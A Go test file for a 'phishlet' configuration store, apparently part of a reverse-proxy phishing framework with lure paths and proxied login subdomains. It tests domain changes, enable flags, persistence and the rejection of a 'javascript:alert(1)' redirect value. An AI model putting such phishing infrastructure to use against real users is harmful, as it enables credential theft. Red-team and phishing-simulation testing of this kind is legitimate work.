package phishlet

import (
	"os"
	"path/filepath"
	"testing"
)

func seedStore(t *testing.T) *Store {
	t.Helper()
	dir := t.TempDir()
	a := "id: pa\nversion: 2\nbase_domains: [\"a.test\"]\n" +
		"proxy_hosts: [{phish_sub: \"login\", orig_sub: \"o\", domain: \"u.test\"}]\n" +
		"lure_path: \"/l/a\"\nenabled: true\n"
	b := "id: pb\nversion: 2\nbase_domains: [\"b.test\"]\n" +
		"proxy_hosts: [{phish_sub: \"login\", orig_sub: \"o\", domain: \"u.test\"}]\n" +
		"lure_path: \"/l/b\"\nenabled: true\n"
	if err := os.WriteFile(filepath.Join(dir, "a.yaml"), []byte(a), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "b.yaml"), []byte(b), 0o600); err != nil {
		t.Fatal(err)
	}
	st := NewStore()
	if err := st.LoadDir(dir); err != nil {
		t.Fatal(err)
	}
	return st
}

func TestSetDomains(t *testing.T) {
	st := seedStore(t)
	if err := st.SetDomains("pa", []string{"evil.test"}); err != nil {
		t.Fatal(err)
	}
	if ph, _ := st.FindByHost("login.evil.test"); ph == nil || ph.ID != "pa" {
		t.Fatal("new domain not resolved")
	}
	if ph, _ := st.FindByHost("login.a.test"); ph != nil {
		t.Fatal("stale host survived")
	}
	// Конфликт с чужим ID — отказ без мутации.
	if err := st.SetDomains("pa", []string{"b.test"}); err == nil {
		t.Fatal("conflict must fail")
	}
	if ph, _ := st.FindByHost("login.evil.test"); ph == nil {
		t.Fatal("live state clobbered")
	}
	// Мусор и неизвестный ID.
	if err := st.SetDomains("pa", nil); err == nil {
		t.Fatal("empty must fail")
	}
	if err := st.SetDomains("pa", []string{"not a domain"}); err == nil {
		t.Fatal("bad domain must fail")
	}
	if err := st.SetDomains("nope", []string{"x.test"}); err == nil {
		t.Fatal("unknown must fail")
	}
}

func TestSetEnabledSave(t *testing.T) {
	st := seedStore(t)
	if err := st.SetEnabled("pa", false); err != nil {
		t.Fatal(err)
	}
	if ph, _ := st.FindByHost("login.a.test"); ph != nil {
		t.Fatal("disabled must not resolve")
	}
	if err := st.Save("pa"); err != nil {
		t.Fatal(err)
	}
	// Перечитываем с диска: enabled=false пережило.
	st2 := NewStore()
	dir := st.dir
	if err := st2.LoadDir(dir); err != nil {
		t.Fatal(err)
	}
	if p := st2.FindByID("pa"); p == nil || p.Enabled {
		t.Fatal("persist broken")
	}
	if err := st.SetEnabled("nope", true); err == nil {
		t.Fatal("unknown must fail")
	}
}
func TestRedirectURLValidate(t *testing.T) {
	st := NewStore()
	_, err := st.UpsertYAML([]byte("id: r\nversion: 2\nbase_domains: [\"a.test\"]\nproxy_hosts: [{phish_sub: \"l\", orig_sub: \"o\", domain: \"u.test\"}]\nlure_path: \"/l/r\"\nenabled: true\nredirect_url: \"javascript:alert(1)\"\n"))
	if err == nil {
		t.Fatal("bad redirect scheme must fail")
	}
}
